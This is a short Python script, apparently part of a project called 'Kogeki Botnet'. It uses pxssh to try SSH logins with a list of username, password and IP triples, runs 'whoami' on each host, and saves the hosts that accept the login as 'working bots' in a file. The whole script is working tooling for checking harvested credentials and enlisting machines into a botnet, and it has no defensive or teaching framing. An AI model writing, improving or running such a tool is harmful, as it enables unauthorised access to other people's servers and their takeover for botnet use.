from pexpect import pxssh
import os
from colorama import Fore, Style
import sys

filename = sys.argv[1]
print()
workingbots = ""
badbots = ""

with open(filename, "r") as ff:
  s = pxssh.pxssh()
  for line in ff:
    try:
      stuff = line.strip().split("~") 
      ip = stuff[-1]
      password = stuff[1]
      username = stuff[0]
      s.login(ip, username, password) #attempts to login with username and password
      s.sendline('whoami') #sends command 'whoami', just for a test!
      print(Fore.YELLOW + ip  + Fore.GREEN + " IS " + Fore.YELLOW + "compatable with Kogeki Botnet!")
      workingbots = workingbots + "\r" + username + "~" + password + "~" + ip + "\n" #adds the host to a working bot if compatable
    except Exception as e:
      print(Fore.YELLOW + ip  + Fore.RED + " IS NOT " + Fore.YELLOW + "compatable with Kogeki Botnet!")
      badbots = badbots + "\r" + username + "~" + password + "~" + ip + "\n"
      
print(Fore.GREEN + "Compatable Bots: ")
print(workingbots)
print()

workingbots = workingbots.strip('\n').strip('\r')

with open('yuko.kogeki', 'w+') as f:
  f.write(workingbots)